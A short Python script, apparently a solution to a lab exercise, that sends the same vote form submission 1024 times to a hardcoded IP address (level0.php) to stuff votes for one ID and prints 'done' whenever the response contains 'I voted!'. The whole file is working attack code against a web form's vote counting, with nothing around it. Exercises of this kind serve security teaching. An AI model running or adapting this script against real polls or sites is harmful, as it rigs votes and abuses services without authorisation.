#!/usr/bin/python3
"""task0"""
import requests


URL = "http://158.69.76.135/level0.php"
payload = {"id": "1324", 'holdthedoor': 'submit'}
f = "I voted!"
for i in range(0, 1024):
    r = requests.post(URL, data=payload)
    if f in r.text:
        print("done {}".format(i))
    else:
        print("failed")
